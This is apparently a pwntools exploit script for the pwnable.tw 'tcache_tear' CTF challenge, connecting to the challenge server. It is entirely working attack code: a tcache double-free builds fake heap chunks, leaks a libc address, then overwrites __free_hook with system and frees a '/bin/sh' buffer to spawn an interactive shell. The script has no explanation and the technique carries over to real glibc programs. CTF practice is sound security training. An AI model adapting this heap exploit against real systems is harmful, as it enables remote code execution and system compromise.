from pwn import *

context.log_level='DEBUG'

local=0
if local:
	p=process('./ptcache_tear')
else:
	p=remote('chall.pwnable.tw',10207)
file=ELF('./ptcache_tear')
libc=ELF('./libc.so.6')

def n(sz,ctnt):
	p.sendlineafter(':','1')
	p.sendlineafter(':',str(sz))
	p.sendlineafter(':',str(ctnt))

def f():
	p.sendlineafter(':','2')

def i():
	p.sendlineafter(':','3')

def dbg():
	if local:
		print 'pid: '+str(p.pid)
		pause()

p.sendlineafter(':','whoami')
#leak
n(0,'1')
f()
f()
n(0,p64(0x602150))
n(0,'2')
payload1=p64(0)+p64(0x21)+p64(0xbaadf00d)*2+p64(0)+p64(0x21)
n(0,payload1)

n(0xf0,'a')
f()		#0
f()		#1
n(0xf0,p64(0x602050))
n(0xf0,'b')
payload2=p64(0)+p64(0x101)+p64(0xbaadf00d)*5+p64(0x602060)
n(0xf0,payload2)
f()		#4
i()
p.recvuntil('Name :')
bin=u64(p.recv(6).ljust(8,'\x00'))
libc_base=bin-0x3ebca0
success('libc: '+hex(libc_base))
#dbg()

free_hook=libc_base+libc.sym['__free_hook']
system=libc_base+libc.sym['system']
success('free_hook: '+hex(free_hook))
success('system: '+hex(system))
n(0x80,'f')
f()		#5
f()		#6
n(0x80,p64(free_hook))
n(0x80,'f')
n(0x80,p64(system))

n(0x40,'/bin/sh\n')
f()

p.interactive()